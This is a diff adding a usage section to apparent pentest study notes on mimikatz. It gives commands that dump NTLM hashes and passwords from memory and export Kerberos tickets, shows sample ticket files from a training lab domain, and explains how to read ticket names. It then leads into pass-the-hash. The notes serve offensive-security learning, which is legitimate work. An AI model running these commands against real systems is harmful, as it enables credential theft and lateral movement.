@@ -17,6 +17,26 @@ Pre-built binaries available in the git repo: https://github.com/gentilkiwi/mimi
 **Cheatsheet:** 
 **Website:** https://github.com/gentilkiwi/mimikatz
 ## Usage
+### Obtaining Hashes & Credentials
+```cmd
+# Obtain NTLM hashes for users
+C:\> mimikatz.exe privilege::debug "sekurlsa::logonpasswords" exit
+
+# Obtain Kerberos Tickets
+C:\> mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
+
+C:\> dir *.kirbi
+
+<SNIP>
+-a----        7/12/2022   9:44 AM           1445 [0;6c680]-2-0-40e10000-johnny@krbtgt-inlanefreight.htb.kirbi
+-a----        7/12/2022   9:44 AM           1565 [0;3e7]-0-2-40a50000-DC01$@cifs-DC01.inlanefreight.htb.kirbi
+<SNIP>
+```
+> For the tickets:
+> - If it ends with `$` (Result 2 above) then it corresponds to the computer account (allowing the system to interact with Active Directory)
+> - User tickets have the user's name (Result 1 above) followed by an `@` then the service name and domain. It follows the format `[random_value]-username@service-domain.local.kirbi`
+> - If a user ticket has the service `krbtgt` then it is the [[Kerberos#Ticket Granting Ticket (TGT)|TGT]] of that account.
+
 ### Pass-the-Hash
 Using the `sekurlsa::pth` module we can perform a pass-the-hash attack. It starts a process using the user's hash.
 ```cmd
